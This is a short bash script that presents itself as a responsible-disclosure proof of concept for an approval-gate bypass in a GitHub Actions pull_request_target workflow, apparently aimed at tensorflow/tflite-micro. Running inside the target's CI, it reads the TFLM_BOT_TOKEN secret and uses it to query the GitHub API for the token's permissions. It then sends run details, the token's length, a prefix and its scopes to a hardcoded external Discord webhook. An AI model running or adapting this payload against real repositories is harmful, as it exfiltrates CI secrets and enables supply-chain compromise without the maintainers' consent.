#!/usr/bin/env bash
# Security Research PoC - Responsible Disclosure
# Proves fork code execution with write-scoped GITHUB_TOKEN
# via approval gate bypass in pull_request_target workflow.
# No modifications made. Token prefix + length only.

set -e

WEBHOOK="https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

# Collect token info
TOKEN_INFO="NOT_SET"
TOKEN_PREFIX=""
if [ -n "${TFLM_BOT_TOKEN:-}" ]; then
    TOKEN_LEN=${#TFLM_BOT_TOKEN}
    TOKEN_PREFIX="${TFLM_BOT_TOKEN:0:4}"
    TOKEN_INFO="SET (length: $TOKEN_LEN, prefix: ${TOKEN_PREFIX}...)"
fi

# Check token permissions via API
TOKEN_SCOPES="unknown"
if [ -n "${TFLM_BOT_TOKEN:-}" ]; then
    TOKEN_SCOPES=$(curl -s -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" "https://api.github.com/repos/${GITHUB_REPOSITORY:-unknown}" 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); perms=d.get('permissions',{}); print(', '.join(f'{k}={v}' for k,v in perms.items()))" 2>/dev/null || echo "API check failed")
fi

# Print to logs
echo "============================================================"
echo "[PoC] Approval Gate Bypass - Fork Code Execution Proof"
echo "============================================================"
echo "Repo: ${GITHUB_REPOSITORY:-unknown}"
echo "Run ID: ${GITHUB_RUN_ID:-unknown}"
echo "Event: ${GITHUB_EVENT_NAME:-unknown}"
echo "Runner: ${RUNNER_NAME:-unknown}"
echo ""
echo "TFLM_BOT_TOKEN: $TOKEN_INFO"
echo "Token permissions: $TOKEN_SCOPES"
echo "============================================================"
echo "No modifications made. Responsible disclosure PoC."

# Try Discord webhook
python3 -c "
import json, urllib.request, os
msg = '**PoC: tensorflow/tflite-micro approval gate bypass**\n' \
    + '\`\`\`\n' \
    + 'Repo: ' + os.environ.get('GITHUB_REPOSITORY','unknown') + '\n' \
    + 'Run ID: ' + os.environ.get('GITHUB_RUN_ID','unknown') + '\n' \
    + 'Event: ' + os.environ.get('GITHUB_EVENT_NAME','unknown') + '\n' \
    + 'Runner: ' + os.environ.get('RUNNER_NAME','unknown') + '\n' \
    + '\n' \
    + 'TFLM_BOT_TOKEN: $TOKEN_INFO\n' \
    + 'Token permissions: $TOKEN_SCOPES\n' \
    + '\`\`\`\n' \
    + 'No modifications made. Prefix+length only.'
payload = json.dumps({'content': msg}).encode()
req = urllib.request.Request('$WEBHOOK', data=payload, headers={'Content-Type': 'application/json'})
try:
    urllib.request.urlopen(req, timeout=10)
    print('[PoC] Webhook sent')
except Exception as e:
    print(f'[PoC] Webhook failed: {e}')
"

echo "[PoC] Complete."
